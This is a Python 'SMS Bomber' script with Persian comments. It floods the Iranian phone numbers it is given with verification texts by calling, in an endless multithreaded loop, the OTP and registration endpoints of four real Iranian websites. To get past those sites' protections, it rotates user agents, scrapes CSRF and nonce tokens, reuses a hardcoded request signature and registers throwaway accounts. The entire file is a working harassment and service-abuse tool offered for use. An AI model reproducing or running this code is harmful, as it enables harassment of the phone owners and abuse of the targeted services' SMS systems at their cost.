import requests
import re
import uuid
import time
from threading import Thread
from time import sleep
import socket
import urllib3
import random

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# تعریف user_agents
user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        result = service(phone)
        if result:
            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
        else:
            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
    except Exception as e:
        print(f"{r}[!] Error in {service.__name__}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================


def Lendo(phone):
    try:
        url = "https://api2.lendo.ir/api/customer/auth/send-otp"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        # تولید timestamp
        timestamp = str(int(time.time() * 1000))
        
        # محاسبه signature (sha)
        # این قسمت نیاز به کلید secret دارد که از سایت باید استخراج شود
        # فعلاً از signature ثابت استفاده می‌کنیم
        signature = "suoFyEBf+aqzIwx82ArDq3BdwxHUuj6mkkzuO3TSK495B//J+4Yf4yTh0c7BNcAfkED0tRBB8vYryDiO8dxb+w=="
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sha": f"SIGN {signature}",
            "X-Timestamp": timestamp,
            "User-Agent": random.choice(user_agents),
            "Origin": "https://lendo.ir",
            "Referer": "https://lendo.ir/",
        }
        
        payload = {
            "mobile": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Lendo Status: {response.status_code}{a}')
        print(f'{y}[Debug] Lendo Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(Lendo) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Lendo Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "sent" in response.text.lower():
                    print(f'{g}(Lendo) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Lendo HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Lendo Exception: {e}{a}')
        return False

def Footini(phone):
    try:
        session = requests.Session()
        
        # دریافت صفحه اصلی
        home_response = session.get(
            "https://footini.ir/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج توکن‌ها
        instance_id_match = re.search(r'name="instance_id" value="([^"]+)"', home_response.text)
        digits_form_match = re.search(r'name="digits_form" value="([^"]+)"', home_response.text)
        
        instance_id = instance_id_match.group(1) if instance_id_match else "default_instance_id"
        digits_form = digits_form_match.group(1) if digits_form_match else "default_digits_form"
        
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        payload = {
            "digt_countrycode": "+98",
            "phone": formatted_phone,
            "digits_reg_name": "نام",
            "digits_reg_username": f"user{random.randint(10000, 99999)}",
            "digits_reg_password": f"Pass{random.randint(1000, 9999)}",
            "digits_process_register": "1",
            "instance_id": instance_id,
            "action": "digits_forms_ajax",
            "type": "register",
            "digits": "1",
            "digits_form": digits_form,
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://footini.ir",
            "Referer": "https://footini.ir/",
        }
        
        response = session.post(
            "https://footini.ir/wp-admin/admin-ajax.php",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Footini Status: {response.status_code}{a}')
        print(f'{y}[Debug] Footini Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(Footini) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Footini HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Footini Exception: {e}{a}')
        return False

def SibApp(phone):
    try:
        url = "https://api.sibapp.net/api/v1/action"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        user_unique_id = str(uuid.uuid4())
        
        payload = {
            "name": "phone_number_verify",
            "data": {
                "utm": {"source": "google", "medium": "organic", "campaign": ""},
                "user_unique_id": user_unique_id,
                "purchase_flow": "",
                "purchase_flow_version": "purchaseFlowABGroup",
                "package_a_b_group": None,
                "package_a_b_group_version": "packagesABGroupV11",
                "register_a_b_group": "c",
                "register_a_b_group_version": "registerABGroupV3",
                "phone_number": formatted_phone
            }
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json; charset=UTF-8",
            "Cache-Control": "no-cache",
            "User-Agent": random.choice(user_agents),
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{y}[Debug] SibApp Status: {response.status_code}{a}')
        print(f'{y}[Debug] SibApp Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(SibApp) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] SibApp HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] SibApp Exception: {e}{a}')
        return False

def nillarayeshi(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        session = requests.Session()
        
        home_response = session.get(
            "https://nillarayeshi.com/", 
            timeout=10, 
            headers={"User-Agent": random.choice(user_agents)}
        )
        home_response.encoding = 'utf-8'
        
        # دیباگ: ببینیم چه چیزی در صفحه هست
        print(f'{y}[Debug] Page content: {home_response.text[:200]}...{a}')
        
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
        nonce_match = re.search(r'name="dig_nounce" value="([^"]+)"', home_response.text)
        
        csrf = csrf_match.group(1) if csrf_match else ""
        nonce = nonce_match.group(1) if nonce_match else ""
        
        if not csrf or not nonce:
            print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
            return False
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,
            "csrf": csrf,
            "login": "2",
            "digits": "1",
            "json": "1",
            "dig_nounce": nonce
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://nillarayeshi.com",
            "Referer": "https://nillarayeshi.com/",
        }
        
        response = session.post(
            "https://nillarayeshi.com/wp-admin/admin-ajax.php",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] nillarayeshi Status: {response.status_code}{a}')
        print(f'{y}[Debug] nillarayeshi Response: {response.text}{a}')
        
        if response.status_code == 200:
            if "success" in response.text.lower() or "1" in response.text:
                print(f'{g}(nillarayeshi) Code Sent{a}')
                return True
        return False
            
    except Exception as e:
        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
        return False


        
# ==========================
# لیست سرویس‌ها
# ==========================
services = [ Footini, Lendo, nillarayeshi, SibApp]

# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    print(f"{y}══════════════════════════════════════════════{a}")
    
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║                SMS Bomber                 ║
{y}╚════════════════════════════════════════════╝
{g} Services Loaded: {y}{len(services)}{a}
{y}══════════════════════════════════════════════
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
